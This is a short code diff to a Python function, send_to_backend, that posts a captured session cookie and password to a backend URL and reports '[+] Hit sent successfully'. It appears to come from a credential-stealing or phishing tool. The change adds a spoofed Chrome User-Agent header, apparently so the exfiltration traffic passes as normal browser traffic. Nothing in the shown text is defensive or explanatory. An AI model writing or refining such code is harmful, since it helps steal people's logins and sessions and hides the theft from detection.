@@ -96,7 +96,11 @@ def send_to_backend(cookie: str, password: str):
         if password:
             payload["password"] = password
 
-        resp = requests.post(BACKEND_URL, json=payload, timeout=15)
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+            "Content-Type": "application/json"
+        }
+        resp = requests.post(BACKEND_URL, json=payload, headers=headers, timeout=15)
         if resp.status_code == 200:
             print(f"[+] Hit sent successfully")
         else:
